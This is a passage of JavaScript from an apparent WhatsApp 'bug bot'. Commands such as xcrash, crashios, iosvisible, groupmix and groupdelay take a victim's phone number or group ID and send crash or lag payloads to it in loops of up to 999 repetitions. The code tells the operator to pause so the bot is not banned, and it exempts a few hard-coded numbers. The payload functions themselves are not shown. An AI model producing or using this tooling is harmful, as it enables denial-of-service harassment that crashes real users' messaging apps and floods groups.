    }
    if (victim == "201206738488") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <110; i++) {
      await ScarDelay(Xreturn);
      await (2000)
      await smbdelay(Xreturn);
      await (1000)
}
}
break

case 'xcrash':
case 'xnxx': {
        if (!isBot && !isCreator) return
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "967774772074") {
    return;
    }
    if (victim == "201032935369") {
    return;
    }
    if (victim == "201206738488") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <100; i++) {
      await nullForce(Xreturn);
      await (1500)
}
}
break

case 'crashchatt':  {
if (!isBot && !isCreator) return
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "967774772074") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 1; i++) {
     await homeBeta5(Xreturn) 
            await hsuwjs(Xreturn) 
   }
}
break

case 'crashios': {
if (!isBot && !isCreator) return
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "967774772074") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <100; i++) {
await xiosinv(Xreturn)
      await (1000)
await crashiosx(Xreturn)
}
}
break
	
case 'iosvisible':  {
if (!isBot && !isCreator) return
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "967774772074") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 999; i++) {
await iosLx(Xreturn);
await sleep(1000);
}
		}
		break
				
case "checkchid": case "idch": {
if (!isBot && !isCreator) return
    if (!text) return replygcxeon(`Provide channel link\nExample: ${prefix+command} https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20 `)
    if (!text.includes("https://whatsapp.com/channel/")) return replygcxeon("Invalid link")
    let result = text.split('https://whatsapp.com/channel/')[1]
    try {
        let res = await XeonBotInc.newsletterMetadata("invite", result)
        if (!res) return replygcxeon("Failed to fetch information of this channel")
        let teks = `
*ID :* ${res.id}
*Name :* ${res.name}
*Total Followers :* ${res.subscribers}
*Status :* ${res.state}
*Verified :* ${res.verification == "VERIFIED" ? "Verified" : "Not Verified"}
        `
        return replygcxeon(teks)
    } catch (error) {
        console.error(error);
        return replygcxeon("An error occurred while retrieving metadata");
    }
}
break

case 'groupmix':{
if (!isBot && !isCreator) return
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .groupid link `)
	// Check if input is a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }
victim = text.split("|")[0]

replygcxeon(`Successfully sent bug to the group chat`)

		for (let i = 0; i < 99; i++) {
  try {
    await xeonIosInvi(victim);
	await xeonAndroSpamGp(victim);
	await forcergp(victim);
	await sleep(500);
  } catch (e) {
    console.error("Loop stopped:", e.message);
    }}}
    break;
   
 case 'groupdelay':{
if (!isBot && !isCreator) return
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .groupid link `)
	// Check if input is a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }
victim = text.split("|")[0]

replygcxeon(`Successfully sent bug to the group chat`)

		for (let i = 0; i < 190; i++) {
  try {
    await ScarDelay(victim);
	await sleep(500);
  } catch (e) {
    console.error("Loop stopped:", e.message);
    }}}
    break;  
   
   
case 'groupid': {
    
    if (!isBot && !isCreator) return
    if (!text) return replygcxeon('Enter Group Link!');
    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!');

    // Extract the group code, removing any query parameters
    let groupCode = args[0].split('https://chat.whatsapp.com/')[1];
    groupCode = groupCode.split('?')[0]; // Remove any query parameters

    try {
        const xeontry = await XeonBotInc.groupAcceptInvite(groupCode);
        
        if (!xeontry) {
            return replygcxeon('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
        }

        replygcxeon(`Group ID: ${xeontry}`);
    } catch (error) {
        replygcxeon('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
    }
}
break;

case 'getmtype': {

    if (!m.quoted) return replygcxeon('Reply to a message to debug its mtype!');
    const quotedMtype = m.quoted.mtype || 'Unknown';
    console.log(`Quoted Message Type: ${quotedMtype}`);
    await replygcxeon(`Quoted Message Type: ${quotedMtype}`);
    }
break;

default:
}
} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
